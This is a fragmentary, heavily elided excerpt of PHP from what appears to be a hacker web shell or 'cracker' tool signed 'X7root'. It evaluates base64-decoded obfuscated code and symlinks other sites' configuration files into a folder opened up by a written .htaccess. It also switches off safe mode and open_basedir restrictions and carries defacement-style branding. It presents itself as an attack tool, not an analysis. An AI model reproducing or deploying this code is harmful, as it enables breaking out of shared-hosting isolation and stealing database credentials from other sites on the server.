...
eval(base64_decode($Getconfig));
    ...
    $this->rows[$i][$k] = @addslashes($v);}
     ...
     echo "<br><title>1962Cracker By X7root</title><form name=form method=POST>";
...
$f = fopen('x7r/.htaccess','w');

fwrite($f,$r);
$consym="<a href=x7r/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
echo "<br>folder where config files has been symlinked Script Coded By X7root<br><u><font color=red size=2 face=\"comic sans ms\">$consym</font></u>";
...
open_basedir = OFF ");
echo "<b>[SafeMode Done] .. :) This Script Is Coded By X7root</b>";
echo ("<br>");
...
?>
        ...
        <tr>
   <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong> X7root Expect Us</strong></td>
       </tr>
